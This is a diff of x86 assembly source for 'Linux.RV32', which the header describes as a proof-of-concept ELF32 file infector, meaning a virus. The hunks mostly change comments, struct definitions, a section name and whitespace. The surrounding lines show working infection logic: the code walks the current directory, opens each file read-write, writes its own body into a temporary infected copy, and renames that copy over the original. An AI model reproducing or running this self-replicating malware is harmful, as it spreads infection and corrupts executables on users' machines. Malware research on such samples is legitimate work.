@@ -1,12 +1,12 @@
  
  ;::::::::::::::::::::::::::::::::::::::::::::::::::
- ;::: 				Linux.RV32 					::::
+ ;::: 		      Linux.RV32 		::::
  ;::::::::::::::::::::::::::::::::::::::::::::::::::
- ;			         			by N4X0R aka ulexec
- ;
- ;
- ; This code below is a proof of concept of an ELF32 
- ; File Infector implemented in x86 assembly
+ ;by ulexec
+ 
+
+ ; Proof of concept of an ELF32 reverse text segment
+ ; File infector for x86.
  ; Enjoi!
 
 [BITS 32]
@@ -45,20 +45,6 @@ endstruc
 struc Elf32_Dyn
 	.d_tag			resd 	1
 	.d_val			resd 	1
-endstruc
-
-struc Elf32_Rel
-	.r_offset		resd 	1	; Address
-	.r_info			resw 	1 	; Relocation type and symbol index
-endstruc
-
-struc Elf32_Sym
-	.st_name		resd 	1	; symbol name strtab ndx
-	.st_value		resd 	1 	; symbol value
-	.st_size		resd 	1	; symbol size
-	.st_info		resb 	1	; symol type and binding
-	.st_other		resb 	1	; symbol visibility
-	.st_shndx		resw 	1	; section ndx
 endstruc
 
 struc dirent32 
@@ -147,7 +133,7 @@ DYNENT			equ 		0x8
 
 ;-------------------------------- CODE --------------------------------------
 
-section .elfvirii0 progbits exec write
+section .rv0 progbits exec write
 
 _start:
 	call .delta32                           ; computing delta
@@ -219,7 +205,7 @@ _start:
 	jz .execute_payload			; therefore execute infector payload
 
 	mov eax, 5				; opening file within current directory
-    mov ebx, [ebp + dirent]
+        mov ebx, [ebp + dirent]
 	lea ebx, [ebx + dirent32.d_name]
 	mov ecx, O_RDWR
 	int 0x80				; calling open(filename_addr, O_RDWR)
@@ -379,7 +365,7 @@ _start:
 	push eax				; calculating address of program header table
 	xor ecx, ecx
 
-    mov eax, 5					; creating a new temporary file in order to craft the infected file
+        mov eax, 5					; creating a new temporary file in order to craft the infected file
 	lea ebx, [ebp + tmp_file]
 	mov ecx, O_WRONLY
 	or  ecx, O_TRUNC
@@ -451,6 +437,7 @@ _start:
     	test edx, edx						
     	jns .invoke_write
     	sub edx, ebp
+
 .invoke_write:					; calling write(tmpfd, _start, filesz)
 	int 0x80	
 
@@ -473,10 +460,10 @@ _start:
 	mov eax, 0x6
 	int 0x80				; calling close(tmpfd)
 
-    mov ebx, [ebp + dirent]			; we want to replace target file with our crafted temp file. we can use syscall rename for that
+        mov ebx, [ebp + dirent]			; we want to replace target file with our crafted temp file. we can use syscall rename for that
 	lea ebx, [ebx + dirent32.d_name]
 	push ebx
-    mov eax, 38
+        mov eax, 38
 	pop ecx
 	lea ebx, [ebp + tmp_file] 
 	int 0x80				; calling rename(tmpfile, targetfile)
